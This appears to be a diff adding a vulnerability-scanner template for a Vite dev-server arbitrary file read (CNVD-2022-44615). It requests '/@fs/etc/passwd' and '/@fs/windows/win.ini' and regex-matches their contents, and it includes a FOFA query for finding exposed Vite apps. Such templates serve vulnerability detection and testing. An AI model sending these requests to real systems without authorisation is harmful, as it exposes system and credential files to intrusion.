@@ -1,0 +1,30 @@
+id: CNVD-2022-44615
+
+info:
+  name: Vite - Arbitrary File Read
+  author: qwtd
+  severity: high
+  description: |
+    The entire filesystem is indiscriminately exposed while the Vite dev server is running. Combined with the fact that the server is exposed to 0.0.0.0 by default, you're effectively opening your machine to the world during development.
+    This is technically a Vite feature as currently documented, but probably not actually intended.
+  reference:
+    - https://github.com/vitejs/vite/issues/2820
+    - https://github.com/hi-unc1e/afrog/blob/7725b4cb6562db7f3a6a8a7a8923d8891cf43d3c/pocs/afrog-pocs/vulnerability/vite-uri-readfile-cnvd-2022-44615.yml#L5
+  metadata:
+    max-request: 2
+    fofa-query: app="Vite-App"
+  tags: Vite-App
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/@fs/etc/passwd"
+      - "{{BaseURL}}/@fs/windows/win.ini"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
